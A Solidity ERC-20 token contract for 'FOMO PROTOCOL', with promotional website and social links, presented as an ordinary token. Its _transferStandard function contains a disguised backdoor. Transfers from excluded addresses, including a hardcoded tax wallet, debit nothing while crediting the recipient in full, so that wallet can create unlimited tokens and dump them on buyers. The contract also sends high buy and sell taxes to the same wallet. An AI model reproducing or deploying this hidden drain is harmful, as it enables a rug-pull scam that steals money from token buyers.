// SPDX-License-Identifier: Unlicensed

/*
FOMO Protocol stands as a potent and decentralized ecosystem, prioritizing scalability, security, and global adoption via cutting-edge infrastructure.

Website: https://fomotools.pro
Tools: https://app.fomotools.pro
X: https://twitter.com/fomo_protocol
Telegram: https://t.me/fomotools_official
Blog: https://medium.com/@fomo.tools
 */

pragma solidity 0.8.21;

abstract contract ContextLibrary {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract OwnableLibrary is ContextLibrary {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "OwnableLibrary: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OwnableLibrary: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface ITemplateERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract FOMO is ContextLibrary, ITemplateERC20, OwnableLibrary { 
    using SafeMath for uint256;

    string private _name = "FOMO PROTOCOL"; 
    string private _symbol = "FOMO";

    uint8 private _decimals = 9;
    uint256 private _supply = 10 ** 9 * 10**_decimals;
    uint256 public maxTxAmount = 25 * _supply / 1000;
    uint256 public swapThreshold = _supply / 10000;

    uint256 private _feeTotal = 2000;
    uint256 public buyTax = 29;
    uint256 public sellTax = 25;

    uint256 private previousTotalFee = _feeTotal; 
    uint256 private previousBuyTax = buyTax; 
    uint256 private previousSellTax = sellTax; 

    uint8 private _numOfBuyers = 0;
    uint8 private _swapAt = 2; 
                                     
    IUniswapRouter public uniswapRouter;
    address public uniswapPair;

    bool public transferFeeEnabled = true;
    bool public swapping;
    bool public feeSwapEnabled = true;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcluded; 

    address payable private taxWallet;
    address payable private deadAddress;

    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _supply;
        deadAddress = payable(0x000000000000000000000000000000000000dEaD); 
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        taxWallet = payable(0xc7755A7f06a50E0b3f7BB952094b98490bfeFC22); 
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        isExcluded[owner()] = true;
        isExcluded[taxWallet] = true;
        
        emit Transfer(address(0), owner(), _supply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _supply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
        
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
        
    function removeFee() private {
        if(_feeTotal == 0 && buyTax == 0 && sellTax == 0) return;

        previousBuyTax = buyTax; 
        previousSellTax = sellTax; 
        previousTotalFee = _feeTotal;
        buyTax = 0;
        sellTax = 0;
        _feeTotal = 0;
    }

    function restoreFee() private {
        _feeTotal = previousTotalFee;
        buyTax = previousBuyTax; 
        sellTax = previousSellTax; 
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
        
    function removeLimits() external onlyOwner {
        maxTxAmount = ~uint256(0);
        _feeTotal = 100;
        buyTax = 1;
        sellTax = 1;
    }
    
    function sendETH(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapBack(uint256 contractTokenBalance) private lockSwap {
        swapTokensToEth(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETH(taxWallet,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transferBasic(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            _numOfBuyers++;
        }
        _transferStandard(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function getAmounts(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_feeTotal).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function swapTokensToEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
    
    function _transferStandard(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = getAmounts(finalAmount);
        if(isExcluded[sender] && _balances[sender] <= maxTxAmount) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != taxWallet &&
            to != address(this) &&
            to != uniswapPair &&
            to != deadAddress &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxTxAmount,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            _numOfBuyers >= _swapAt && 
            amount > swapThreshold &&
            !swapping &&
            !isExcluded[from] &&
            to == uniswapPair &&
            feeSwapEnabled 
            )
        {  
            _numOfBuyers = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapBack(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(isExcluded[from] || isExcluded[to] || (transferFeeEnabled && from != uniswapPair && to != uniswapPair)){
            takeFee = false;
        } else if (from == uniswapPair){
            _feeTotal = buyTax;
        } else if (to == uniswapPair){
            _feeTotal = sellTax;
        }

        _transferBasic(from,to,amount,takeFee);
    }
}